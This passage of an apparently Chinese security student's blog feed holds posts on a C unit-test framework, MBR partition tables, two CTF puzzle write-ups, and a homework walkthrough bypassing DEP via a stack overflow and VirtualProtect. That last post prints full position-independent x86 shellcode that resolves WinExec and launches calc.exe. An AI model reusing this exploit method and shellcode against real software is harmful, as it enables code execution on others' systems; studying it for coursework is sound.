class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; func_cnt; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(GREEN(<span class="string">&quot;[  RUN     ] &quot;</span>) <span class="string">&quot;%s\n&quot;</span>, func_arr[i].func_name);</span><br><span class="line">        func_arr[i].func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先我们看测试cpp里的这些内容</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">TEST(test, add) &#123;</span><br><span class="line">    EXPECT_EQ(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_NE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">8</span>);</span><br><span class="line">    EXPECT_GT(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_LT(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">8</span>);</span><br><span class="line">    EXPECT_GE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">    EXPECT_LE(add(<span class="number">3</span>, <span class="number">4</span>), <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的TEST和EXPECT_EQ等等，明显可看出是宏，于是我们在mytest.h里看看他们的定义<br>首先是EXPECT系列的宏定义，这里我们还把宏给封装了一下。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT(a, comp, b) &#123; \</span></span><br><span class="line">    <span class="keyword">if</span> (!((a) comp (b))) \</span><br><span class="line">        expect_printf(__FILE__, __LINE__,  \</span><br><span class="line">        <span class="string">&quot;((&quot;</span> <span class="meta">#a <span class="meta-string">&quot;) &quot;</span> #comp <span class="meta-string">&quot; (&quot;</span> #b <span class="meta-string">&quot;))&quot;</span>); \</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_EQ(a, b) EXPECT(a, ==, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_NE(a, b) EXPECT(a, !=, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_GT(a, b) EXPECT(a, &gt;, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_GE(a, b) EXPECT(a, &gt;=, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_LT(a, b) EXPECT(a, &lt;, b)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXPECT_LE(a, b) EXPECT(a, &lt;=, b)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>宏的特点就是只替换，经过替换可以看出来他是判断条件是否成立，如果不成立就去调用expect_printf函数来输出错误，这里<strong>FILE</strong> <strong>LINE</strong> 都是编译器自带的变量。<br>于是我们来看看expect_printf函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expect_printf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *file_name, <span class="keyword">int</span> line_no, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(YELLOW(<span class="string">&quot;\t%s : %d : Failure\n&quot;</span>), file_name, line_no);</span><br><span class="line">    <span class="built_in">printf</span>(YELLOW(<span class="string">&quot;\t\t%s\n&quot;</span>), msg);</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是把东西打印出去罢了，不过我们可以看到这里又有了宏YELLOW</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COLOR(msg, code) <span class="meta-string">&quot;\033[&quot;</span> #code <span class="meta-string">&quot;m&quot;</span> msg <span class="meta-string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GREEN(msg) COLOR(msg, 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YELLOW(msg) COLOR(msg, 33)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BLUE(msg) COLOR(msg, 34)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RED(msg) COLOR(msg, 35)</span></span><br></pre></td></tr></table></figure><p>而COLOR的宏定是这样，就是shell变颜色高亮的输出语法。</p><p>TEST的宏定义：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST(a, b) \</span></span><br><span class="line"><span class="keyword">void</span> a##_#<span class="meta">#b(); \</span></span><br><span class="line">__attribute__((constructor)) \</span><br><span class="line"><span class="keyword">void</span> register_#<span class="meta">#a##_##b() &#123; \</span></span><br><span class="line">    add_test(a##_#<span class="meta">#b, #a <span class="meta-string">&quot;.&quot;</span> #b); \</span></span><br><span class="line">&#125; \</span><br></pre></td></tr></table></figure><p>这里定义了一个构造器函数register_a_b(),他调用add_test(a_b,”a.b”),其中a_b是函数指针，a.b是函数名。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_test</span><span class="params">(<span class="keyword">void</span> (*func)(), <span class="keyword">const</span> <span class="keyword">char</span> *func_name)</span> </span>&#123;</span><br><span class="line">    func_arr[func_cnt].func = func;</span><br><span class="line">    func_arr[func_cnt].func_name = strdup(func_name);</span><br><span class="line">    func_cnt += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而add_test函数就这，在这个函数上面几行我们定义了func_arr和func_cnt的全局变量，前者的类型是void指针+char数组，存储函数的函数指针和函数名，后者的类型是int，记录一共有几个函数。</p><p>最后就是我们在main.cpp中调用的函数</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RUN_ALL_TESTS</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(GREEN(<span class="string">&quot;[==========] &quot;</span>) <span class="string">&quot;Running %d tests\n&quot;</span>, func_cnt);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; func_cnt; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(GREEN(<span class="string">&quot;[  RUN     ] &quot;</span>) <span class="string">&quot;%s\n&quot;</span>, func_arr[i].func_name);</span><br><span class="line">        func_arr[i].func();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是循环func_arr中存储的测试函数来测试。<br>这样，我们的测试就成了。</p><h1 id="看看结果"><a href="#看看结果" class="headerlink" title="看看结果"></a>看看结果</h1><p><img src="/2020/07/07/%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/1.jpg" alt></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;菜bpillar报名了他们学校的实训，听了老师对单元测试框架的讲解，觉得非常牛逼，打算写一篇博客整理整理。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>分区表</title>
    <link href="https://blog.pillar.fun/2020/06/14/%E5%88%86%E5%8C%BA%E8%A1%A8/"/>
    <id>https://blog.pillar.fun/2020/06/14/%E5%88%86%E5%8C%BA%E8%A1%A8/</id>
    <published>2020-06-14T10:16:50.000Z</published>
    <updated>2020-06-15T10:37:18.803Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>今天我们来深入理解一下MBR中的DPT部分</p><a id="more"></a><p>我们考试考的是MBR而不是GPT，而现在很多电脑都是GPT了，所以你看着可能有点脱离实际，有空应该会更新GPT。</p><h1 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h1><p>以前我们提到过主引导分区MBR（Master Boot Record），MBR的作用是什么呢？主要如下</p><ol><li>提供开机菜单选项：可以供用户选择启动哪个操作系统，这是多重引导功能。</li><li>加载操作系统内核：每个操作系统都有自己的内核，需要引导程序来加载</li><li>转交给其他引导程序：可以将工作移交给其他引导程序来进行上述操作。</li></ol><p>其实引导加载程序除了可以安装在MBR中，还可以直接安装在每个分区的引导扇区(DBR)中，注意下，每个分区(主分区、逻辑分区)都有一个自己的启动扇区，专门用来安装引导加载程序</p><h1 id="DPT"><a href="#DPT" class="headerlink" title="DPT"></a>DPT</h1><p>在之前的博文“FAT32文件系统”中有简单的讲MBR的格式，DPT就在他的MBR512字节的后64字节，每个DPT表项的长度为16字节。比如：<br>80 01 01 00 0B FE BF FC 3F 00 00 00 7E 86 BB 00<br>这里我们直观地可以这样显示<br><img src="/2020/06/14/%E5%88%86%E5%8C%BA%E8%A1%A8/1.jpg" alt></p><p>其中，分区系统类型主要如下<br><img src="/2020/06/14/%E5%88%86%E5%8C%BA%E8%A1%A8/2.png" alt><br>然而我们有可能看到0f，这也是在之后的FAT LBA项目的结果，我们在这先不讨论了。</p><p>由于这块只有64个字节，也就是4个DPT表项，因此在MBR分区下主分区最多4个，更多的只能是拓展分区。而每个分区都有一块这样的数据块，可以链式的拓展分区。</p><p>参考链接<br><a href="https://www.cnblogs.com/zhangming-blog/articles/5392115.html">https://www.cnblogs.com/zhangming-blog/articles/5392115.html</a><br><a href="https://blog.51cto.com/shitou118/212220">https://blog.51cto.com/shitou118/212220</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;今天我们来深入理解一下MBR中的DPT部分&lt;/p&gt;</summary>
    
    
    
    
    <category term="计算机基础" scheme="https://blog.pillar.fun/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>VirtualProtect绕过DEP</title>
    <link href="https://blog.pillar.fun/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/"/>
    <id>https://blog.pillar.fun/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/</id>
    <published>2020-06-08T05:05:46.000Z</published>
    <updated>2020-06-08T07:27:07.118Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>这是我的软件安全作业，希望能同学们启发。</p><a id="more"></a><p>具体内容是设计一个shellcode绕过DEP保护然后让他打开计算器。</p><h1 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h1><p>数据执行保护 (DEP) 是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码。 在 Microsoft Windows XP Service Pack 2、 Microsoft Windows Server 2003 Service Pack 1 、 Microsoft Windows XP Tablet PC Edition 2005 、 Microsoft Windows Vista 和 windows 7 中，由硬件和软件一起强制实施 DEP。DEP 有两种模式，如果CPU 支 持内存页NX 属性， 就是硬件支持的DEP。只有当处理器/系统支持NX/XD位（禁止执行）时，windows才能拥有硬件DEP，否则只能支持软件 DEP，相当于只有SafeSEH保护。<br>简单来说就是会检查你的eip指向的内存段属性，如果不是代码段就给你中断了。</p><p>DEP的绕过思路一般有以下三个</p><ol><li>关闭进程DEP</li><li>将shellcode存储位置设置为可执行</li><li>将shellcode写入可执行的位置</li></ol><p>这里我们就采取的是思路2，利用VirtualProtect函数来修改shellcode所在内存的属性。</p><h1 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h1><p>说到绕过DEP，首先显然要说说ROP（return-oriented programming），ROP基本原理如下：<br>小部件(gadget)：内存中一个个以ret为结尾的指令序列（非常形象），我们像捡破烂一样收集它们。<br>ret指令：ret指令实际上就是将eip赋为esp指的值，再将esp增加两个字节，也就是将EIP设置为esp指向的值，也就是跳转到栈顶的值所指向的地址。<br>在整个过程中，eip都在我们收集的小部件上，而这些小部件都在代码段，所以DEP不会对他进行什么干涉，也就能事先我们要的功能了。</p><h1 id="VirtualProtect"><a href="#VirtualProtect" class="headerlink" title="VirtualProtect"></a>VirtualProtect</h1><p>VirtualProtect，是对应 Win32 函数的逻辑包装函数，它会在呼叫处理程序的虚拟位置空间里，变更认可页面区域上的保护。<br>具体接受的参数如下：<br>BOOL WINAPI VirtualProrect(<br>__in    LPVOID lpAddress ,      //指向需要修改保护属性的页的基地址。<br>__in    SIZE_T dwSize ,         //需改变保护属性的内存大小<br>__in    DWORD flNewProtect ,    //内存保护属性常量<br>__out  PDWORD lpflOldProtect    //原本内存保护属性的保存地址<br>);</p><p>flNewProtect可以设置为一下属性：<br>0x10 PAGE_EXECUTE：区域包含可被系统执行的代码。试图读写该区域的操作将被拒绝。<br>0x20 PAGE_EXECUTE_READ：区域包含可执行代码，应用程序可以读该区域。<br>0x40 PAGE_EXECUTE_READWRITE：区域包含可执行代码，应用程序可以读写该区域。<br>0x80 PAGE_EXECUTE_WRITECOPY： 启用对文件映射对象的映射视图的只读或写时复制访问。<br>0x01 PAGE_NOACCESS：任何访问该区域的操作将被拒绝。<br>0x02 PAGE_READONLY：该区域为只读。如果应用程序试图访问区域中的页的时候，将会被拒绝访问。<br>0x04 PAGE_READWRITE：区域可被应用程序读写。<br>详细内容请参考<a href="https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants">memory protection constants</a></p><p>利用VirtualProtect函数，我们就可以改变栈内内存的属性，使其变为可执行。</p><h1 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h1><p>打开老师发给我的程序，看看它是做什么的<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/1.png" alt><br>他是导入一个文本文件然后将他的内容显示到文本框中，并且经过导入图片测试发现他并不能二进制打开文件并回显。<br>对这个程序栈溢出攻击，构造一个定位的payload<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/2.png" alt><br>用windbg previewer来查看（因为他会在出错的地方中断但不处理，相当于自动断点，比较好使），这里还要记下esp的内容，在后面有用。<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/3.png" alt><br>发现eip被覆盖为了0x68676665，也就是ascii的efgh，也就定位到了调用函数的返回地址，同时也可以查看堆栈的内存情况<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/4.png" alt><br>下一步我们要做的就是覆盖返回地址为VirtualProtect函数的地址，使用ida查看引入函数表，找到VirtualProtect函数<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/5.png" alt><br>值得注意的是，这里存放的是指向VirtualProtect函数的指针的地址，因此我们用OD打开这个程序，到对应地址找到VirtualProtect真正的地址<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/6.png" alt><br>去那里验证一下是不是VirtualProtect,顺便加个断点，以便于之后的调试。<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/7.png" alt><br>然后就是存放参数，在调用函数时候，函数地址后面会有两个DWORD被系统自己压栈，他们分别存放的是call之后下一条语句的地址和当前的ebp，这两个值没什么关系，因为改好了内存属性之后我们编写的shellcode会有对应的堆栈操作来使堆栈可以使用。而且call下一条语句由于VirtualProtect有ret指令也会直接将eip变为esp所指向的位置。<br>然后我们挨个往下放好参数即可，其中修改的内存基地址是在之前看的esp的内容。<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/8.png" alt><br>利用之前的断点，可以看到call的参数（在右下角），这里我随便找了个之前用aaaa覆盖的地址来存放修改前的内存属性。<br><img src="/2020/06/08/VirtualProtect%E7%BB%95%E8%BF%87DEP/9.png" alt><br>然后我们在网上找个打开计算器的shellcode（当然自己写更好）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_asm</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F;寻找kernel32.dll的基地址</span><br><span class="line">        xor ecx, ecx;</span><br><span class="line">        mov eax, dword ptr fs : [ecx + 30h]; &#x2F;&#x2F;EAX &#x3D; PEB</span><br><span class="line">        mov eax, dword ptr[eax + 0Ch]; &#x2F;&#x2F;EAX &#x3D; PEB-&gt;Ldr</span><br><span class="line">        mov esi, dword ptr[eax + 14h]; &#x2F;&#x2F;ESI &#x3D; PEB-&gt;Ldr.InMemOrder</span><br><span class="line">        lods dword ptr[esi]; &#x2F;&#x2F;EAX &#x3D; Second module</span><br><span class="line">        xchg eax, esi; &#x2F;&#x2F;EAX &#x3D; ESI, ESI &#x3D; EAX</span><br><span class="line">        lods dword ptr[esi]; &#x2F;&#x2F;EAX &#x3D; Third(kernel32)</span><br><span class="line">        mov ebx, dword ptr[eax + 10h]; &#x2F;&#x2F;EBX &#x3D; Base address</span><br><span class="line">        &#x2F;&#x2F;查找kernel32.dll的导出表</span><br><span class="line">        mov edx, dword ptr[ebx + 3Ch]; &#x2F;&#x2F;EDX &#x3D; DOS-&gt;e_lfanew</span><br><span class="line">        add edx, ebx; &#x2F;&#x2F;EDX &#x3D; PE Header</span><br><span class="line">        mov edx, dword ptr[edx + 78h]; &#x2F;&#x2F;EDX &#x3D; Offset export table</span><br><span class="line">        add edx, ebx; &#x2F;&#x2F;EDX &#x3D; Export table</span><br><span class="line">        mov esi, dword ptr[edx + 20h]; &#x2F;&#x2F;ESI &#x3D; Offset names table</span><br><span class="line">        add esi, ebx; &#x2F;&#x2F;ESI &#x3D; Names table</span><br><span class="line">        xor ecx, ecx; &#x2F;&#x2F;EXC &#x3D; 0</span><br><span class="line">        &#x2F;&#x2F;循环查找GetProcAddress函数</span><br><span class="line">    Get_Function:</span><br><span class="line">        inc ecx; &#x2F;&#x2F;Increment the ordinal</span><br><span class="line">        lods dword ptr[esi]; &#x2F;&#x2F;Get name offset</span><br><span class="line">        add eax, ebx; &#x2F;&#x2F;Get function name</span><br><span class="line">        cmp dword ptr[eax], 50746547h; &#x2F;&#x2F;GetProcAddress</span><br><span class="line">        jne Get_Function; &#x2F;&#x2F;Get_Function</span><br><span class="line">        cmp dword ptr[eax + 4], 41636F72h; &#x2F;&#x2F;rocAddress</span><br><span class="line">        jne Get_Function; &#x2F;&#x2F;Get_Function</span><br><span class="line">        cmp dword ptr[eax + 8], 65726464h; &#x2F;&#x2F;ddress</span><br><span class="line">        jne Get_Function; &#x2F;&#x2F;Get_Function</span><br><span class="line">        &#x2F;&#x2F;寻找GetProcAddress 函数</span><br><span class="line">        mov esi, dword ptr[edx + 24h]; &#x2F;&#x2F;ESI &#x3D; Offset ordinals</span><br><span class="line">        add esi, ebx; &#x2F;&#x2F;ESI &#x3D; Ordinals table</span><br><span class="line">        mov cx, word ptr[esi + ecx * 2]; &#x2F;&#x2F;CX &#x3D; Number of function</span><br><span class="line">        dec ecx</span><br><span class="line">            mov esi, dword ptr[edx + 1Ch]; &#x2F;&#x2F;ESI &#x3D; Offset address table</span><br><span class="line">        add esi, ebx; &#x2F;&#x2F;ESI &#x3D; Address table</span><br><span class="line">        mov edx, dword ptr[esi + ecx * 4]; &#x2F;&#x2F;EDX &#x3D; Pointer(offset)</span><br><span class="line">        add edx, ebx; &#x2F;&#x2F;EDX &#x3D; GetProcAddress</span><br><span class="line">        push ebx; &#x2F;&#x2F;PUSH kernel32.Base address</span><br><span class="line">        push edx; &#x2F;&#x2F;PUSH kernel32.GetProcAddress</span><br><span class="line">        &#x2F;&#x2F;寻找WinExec函数地址</span><br><span class="line">        xor ecx, ecx; &#x2F;&#x2F;ECX &#x3D; 0</span><br><span class="line">        push ecx; &#x2F;&#x2F;PUSH ECX</span><br><span class="line">        mov ecx, 61636578h; &#x2F;&#x2F;string acex</span><br><span class="line">        push ecx; &#x2F;&#x2F;PUSH ECX</span><br><span class="line">        sub dword ptr[esp + 3], 61h; &#x2F;&#x2F;Remove &quot;a&quot; ESP &#x3D; &amp;0012FE18---&gt;string xec</span><br><span class="line">        push 456E6957h; &#x2F;&#x2F;string EniW</span><br><span class="line">        push esp; &#x2F;&#x2F;PUSH ESP WinExec</span><br><span class="line">        push ebx; &#x2F;&#x2F;PUSH EBX kernel32.Base address</span><br><span class="line">        call edx; &#x2F;&#x2F;CALL GetProcAddress</span><br><span class="line">        add esp, 8; &#x2F;&#x2F;ESP + 8</span><br><span class="line">        pop ecx; &#x2F;&#x2F;ECX &#x3D; 0</span><br><span class="line">        push eax; &#x2F;&#x2F;PUSH EAX-- &gt; kernel32.WinExec Addresss</span><br><span class="line">        &#x2F;&#x2F;赋值命令行字符串</span><br><span class="line">        xor ecx, ecx; &#x2F;&#x2F;ECX &#x3D; 0</span><br><span class="line">        push ecx; &#x2F;&#x2F;PUSH ECX</span><br><span class="line">        push 0x6578652E;</span><br><span class="line">        push 0x636C6163; &#x2F;&#x2F;calc.exe</span><br><span class="line">        xor ebx, ebx; &#x2F;&#x2F;EBX &#x3D; 0</span><br><span class="line">        mov ebx, esp; &#x2F;&#x2F;EBX &#x3D; &quot;calc.exe&quot;</span><br><span class="line">        xor ecx, ecx; &#x2F;&#x2F;ECX &#x3D; 0</span><br><span class="line">        inc ecx; &#x2F;&#x2F;EXC &#x3D; 1</span><br><span class="line">        push ecx; &#x2F;&#x2F;PUSH ECX &#x3D; 1</span><br><span class="line">        push ebx; &#x2F;&#x2F;PUSH EBX &#x3D; &quot;calc.exe&quot;</span><br><span class="line">        call eax; &#x2F;&#x2F;CALL WinExec</span><br><span class="line">        &#x2F;&#x2F;堆栈平衡</span><br><span class="line">        add esp, 10h; &#x2F;&#x2F;ESP + 50h</span><br><span class="line">        pop edx; &#x2F;&#x2F;EDX &#x3D; kernel32.GetProcAddress</span><br><span class="line">        pop ebx; &#x2F;&#x2F;EBX &#x3D; kernel32.Base Address</span><br><span class="line">        &#x2F;&#x2F;退出程序</span><br><span class="line">        xor ecx, ecx; &#x2F;&#x2F;ECX &#x3D; 0</span><br><span class="line">        mov ecx, 61737365h; &#x2F;&#x2F;string asse</span><br><span class="line">        push ecx; &#x2F;&#x2F;PUSH ECX</span><br><span class="line">        sub dword ptr[esp + 3], 61h; &#x2F;&#x2F;Remove &quot;a&quot;</span><br><span class="line">        push 636F7250h; &#x2F;&#x2F;string; Proc</span><br><span class="line">        push 74697845h; &#x2F;&#x2F;string; Exit</span><br><span class="line">        push esp; &#x2F;&#x2F;string &quot;ExitProcess&quot;</span><br><span class="line">        push ebx; &#x2F;&#x2F;kernel32.dll base address</span><br><span class="line">        call edx; &#x2F;&#x2F;GetProcAddress(Exec)</span><br><span class="line">        xor ecx, ecx; &#x2F;&#x2F;ECX &#x3D; 0</span><br><span class="line">        push ecx; &#x2F;&#x2F;Return code &#x3D; 0</span><br><span class="line">        call eax; &#x2F;&#x2F;ExitProcess</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导出机器码，直接用winhex贴在被修改了内存属性的地址之后即可。<br>然后使用程序打开shellcode，就可以发现自动的弹出了计算器。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>如果想要自动生成rop的话推荐<a href="https://github.com/corelan/mona">mona插件</a><br>冲冲冲！</p><p>参考：<br><a href="https://www.cnblogs.com/Wrong-Side/p/4547754.html">https://www.cnblogs.com/Wrong-Side/p/4547754.html</a><br><a href="https://www.cnblogs.com/lei9019/archive/2012/02/20/2359020.html">https://www.cnblogs.com/lei9019/archive/2012/02/20/2359020.html</a><br><a href="https://www.cnblogs.com/bCPTdtPtp/p/12382726.html">https://www.cnblogs.com/bCPTdtPtp/p/12382726.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;这是我的软件安全作业，希望能同学们启发。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>i春秋-小可爱</title>
    <link href="https://blog.pillar.fun/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/"/>
    <id>https://blog.pillar.fun/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/</id>
    <published>2020-06-02T08:25:14.000Z</published>
    <updated>2020-06-08T11:29:24.142Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=2499">点击这里去答题</a></p><a id="more"></a><h1 id="小可爱"><a href="#小可爱" class="headerlink" title="小可爱"></a>小可爱</h1><p>白给一张图，winhex打开看看，肉眼看不出隐藏了什么内容。<br>用binwalk打开，发现有一个zip，用-e把它提取出来<br><img src="/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/1.jpg" alt><br>知道密码为8位数字，直接用archpr暴破<br><img src="/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/2.jpg" alt><br><img src="/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/3.jpg" alt><br>得到密码<br><img src="/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/4.jpg" alt><br>然后噩梦开始<br><img src="/2020/06/02/i%E6%98%A5%E7%A7%8B-%E5%B0%8F%E5%8F%AF%E7%88%B1/5.png" alt><br>建议打印。我反正是吐了。<br>拼完扫出来就是答案了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.ichunqiu.com/battalion?q=2499&quot;&gt;点击这里去答题&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://blog.pillar.fun/tags/ctf/"/>
    
    <category term="misc" scheme="https://blog.pillar.fun/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>i春秋-要想会，先学会</title>
    <link href="https://blog.pillar.fun/2020/06/01/i%E6%98%A5%E7%A7%8B-%E8%A6%81%E6%83%B3%E4%BC%9A%EF%BC%8C%E5%85%88%E5%AD%A6%E4%BC%9A/"/>
    <id>https://blog.pillar.fun/2020/06/01/i%E6%98%A5%E7%A7%8B-%E8%A6%81%E6%83%B3%E4%BC%9A%EF%BC%8C%E5%85%88%E5%AD%A6%E4%BC%9A/</id>
    <published>2020-06-01T13:52:08.000Z</published>
    <updated>2020-06-08T11:30:07.228Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p><a href="https://www.ichunqiu.com/battalion?q=4575">点击这里去答题</a></p><a id="more"></a><h1 id="要想会，先学会"><a href="#要想会，先学会" class="headerlink" title="要想会，先学会"></a>要想会，先学会</h1><p>题目是一个pcapng，用wireshark打开，先提取http对象，发现下面内容<br><img src="/2020/06/01/i%E6%98%A5%E7%A7%8B-%E8%A6%81%E6%83%B3%E4%BC%9A%EF%BC%8C%E5%85%88%E5%AD%A6%E4%BC%9A/1.jpg" alt><br>并且他们都是打不开的，说明思路有问题，这顶多是个提示。于是查看数据包，可以发现有很多icmp数据，我们都知道icmp最常见的应用是ping，他只是看看网络通不通，他有这么多一定有东西，所以我们筛出icmp数据包。<br><img src="/2020/06/01/i%E6%98%A5%E7%A7%8B-%E8%A6%81%E6%83%B3%E4%BC%9A%EF%BC%8C%E5%85%88%E5%AD%A6%E4%BC%9A/2.jpg" alt><br>可以发现数据包的长度都有所不同，且不同的内容全是ABCD啥的填充，结合弹出来的ascii，我们不难猜到这是ascii值，于是直接转换，发现是<br><img src="/2020/06/01/i%E6%98%A5%E7%A7%8B-%E8%A6%81%E6%83%B3%E4%BC%9A%EF%BC%8C%E5%85%88%E5%AD%A6%E4%BC%9A/3.jpg" alt><br>所以应该有偏移，我们知道f和l的差是6，而150-144=6，所以设偏移为42，发现确实如此<br><img src="/2020/06/01/i%E6%98%A5%E7%A7%8B-%E8%A6%81%E6%83%B3%E4%BC%9A%EF%BC%8C%E5%85%88%E5%AD%A6%E4%BC%9A/4.jpg" alt></p>]]></content>
    
    
